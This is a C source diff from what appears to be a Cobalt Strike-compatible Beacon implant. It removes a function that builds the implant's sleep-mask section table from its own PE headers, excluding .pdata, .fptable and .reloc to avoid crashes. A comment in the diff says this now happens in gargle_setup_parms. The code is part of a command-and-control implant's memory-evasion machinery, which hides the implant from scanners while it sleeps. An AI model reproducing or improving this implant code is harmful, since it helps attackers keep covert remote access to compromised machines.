@@ -259,60 +259,6 @@ void setup_functions(BOFF_FUNCTIONS * f) {
 	f->BeaconGetCustomUserData      = BeaconGetCustomUserData;
 }
 
-/* Build the sleep-mask sections table from OUR OWN PE headers instead of the
- * TS-delivered SETTING_GARGLE_SECTIONS layout. The delivered pairs are
- * computed for the official sleeve image; applied verbatim to ours they
- * cover different data. In the 4.9.1 delivery pair 5 (0x62000-0x62100)
- * lands on our .pdata: masking it makes any exception dispatch during the
- * masked Sleep window read garbage RUNTIME_FUNCTION entries and fail-fast
- * the process. Mask the header page plus .text/.rdata/.data; skip
- * .pdata/.fptable/.reloc. */
-static DWORD sm_build_own_table(GARGLEP * gp) {
-	static DWORD own[34];
-	unsigned short lfanew, optsize, nsec;
-	unsigned int i, imgsz;
-	DWORD count = 1;
-	DWORD span = 0x1000;
-	if (gp == NULL || gp->beacon_ptr == NULL)
-		return 0;
-	if (gp->beacon_ptr[0] != 'M' || gp->beacon_ptr[1] != 'Z')
-		return 0;
-	memcpy(&lfanew, gp->beacon_ptr + 0x3C, sizeof(lfanew));
-	memcpy(&optsize, gp->beacon_ptr + lfanew + 20, sizeof(optsize));
-	memcpy(&nsec, gp->beacon_ptr + lfanew + 6, sizeof(nsec));
-	memcpy(&imgsz, gp->beacon_ptr + lfanew + 24 + 0x50, sizeof(imgsz));
-	if (lfanew == 0 || lfanew >= 0x400 || optsize < 0xD0 || optsize >= 0x400 ||
-			nsec == 0 || nsec > 16 || imgsz == 0 || imgsz > 0x10000000)
-		return 0;
-	own[0] = 0;
-	own[1] = 0x1000;
-	for (i = 0; i < nsec && count < 16; i++) {
-		char * sh = gp->beacon_ptr + lfanew + 24 + optsize + i * 40;
-		unsigned int vs, va;
-		char nm[9];
-		memcpy(nm, sh, 8);
-		nm[8] = 0;
-		if (strcmp(nm, ".pdata") == 0 || strcmp(nm, ".fptable") == 0 ||
-				strcmp(nm, ".reloc") == 0)
-			continue;
-		memcpy(&vs, sh + 8, 4);
-		memcpy(&va, sh + 12, 4);
-		if (va < 0x1000 || va >= imgsz || vs == 0)
-			continue;
-		if (va + vs > imgsz)
-			vs = imgsz - va;
-		own[count * 2] = va;
-		own[count * 2 + 1] = va + vs;
-		if (va + vs > span)
-			span = va + vs;
-		count++;
-	}
-	own[count * 2] = 0;
-	own[count * 2 + 1] = 0;
-	gp->sections = own;
-	return span;
-}
-
 /*
  * These get somewhat complicated. Here's what the variables mean:
  *
@@ -689,9 +635,8 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 					gparms->sections = info.sections;
 					gparms->heap_records = info.heap_records;
 					memcpy(gparms->mask, info.mask, MASK_SIZE);
-					/* Replace the delivered layout with our own PE section
-					 * ranges (see sm_build_own_table). */
-					sm_build_own_table(gparms);
+					/* sections are already the own-PE table built by
+					 * gargle_setup_parms (see gargleint.cpp) */
 				}
 				if (gparms == NULL)
 					Sleep(t);
